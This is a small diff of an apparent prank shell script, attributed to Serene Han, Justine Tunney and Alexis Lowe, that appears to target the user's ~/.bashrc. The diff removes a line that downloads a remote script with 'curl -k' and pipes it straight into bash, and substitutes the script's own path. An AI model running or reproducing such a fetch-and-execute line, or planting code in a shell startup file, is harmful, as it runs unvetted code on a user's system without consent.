@@ -3,7 +3,7 @@
 # By Serene Han and Justine Tunney <3
 # Improved by Alexis Lowe aka Chimbosonic
 
-NEVER_GONNA='curl -s -k -L https://chimbosonic.com/lol/lol.sh | bash'
+NEVER_GONNA=$(pwd)/$0
 MAKE_YOU_CRY="$HOME/.bashrc"
 
 red='\x1b[38;5;9m'
